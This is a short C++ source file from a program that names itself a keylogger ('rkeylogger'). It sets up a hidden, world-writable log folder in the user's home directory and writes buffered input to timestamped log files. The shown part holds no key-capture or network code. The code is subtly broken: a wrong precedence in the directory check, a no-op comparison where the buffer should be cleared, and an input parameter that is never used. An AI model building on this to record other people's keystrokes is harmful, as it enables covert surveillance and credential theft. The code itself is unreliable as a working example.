#include "rkeylogger.h"
#include <fstream>
#include <sys/stat.h>
#include <iostream>

std::string folder_output = "";
std::ofstream current_file("");
std::string current_text = "";

bool create_save_folder(){
    const char* home_path = std::getenv("HOME");
    if (!home_path)
        return false;
    
    std::string folder_path = std::string(home_path) + "/.rkeylogger";
    struct stat info;

    if (!stat(folder_path.c_str(), &info) == 0 && S_ISDIR(info.st_mode)) {
        if (mkdir(folder_path.c_str(), 0777) == 0){
            folder_output = folder_path; 
            std::cout << "[ LOG5 ]: Use the following foler to save all logs: " << folder_path << std::endl;
            return true;
        }
    }else{
        folder_output = folder_path; 
        std::cout << "[ LOG ]: Use the following foler to save all logs: " << folder_path << std::endl;
        return true;
    }

    return false;
}        

void close_save_file(){
    current_file.close();
}

void save_input(const char* text){
    if(!current_file.is_open()){
        current_file.open(folder_output + "/" + current_datetime() + ".log");
    }
    
    if(current_text.size() > 5){
        current_file << current_text;
        current_text == "";
    }
}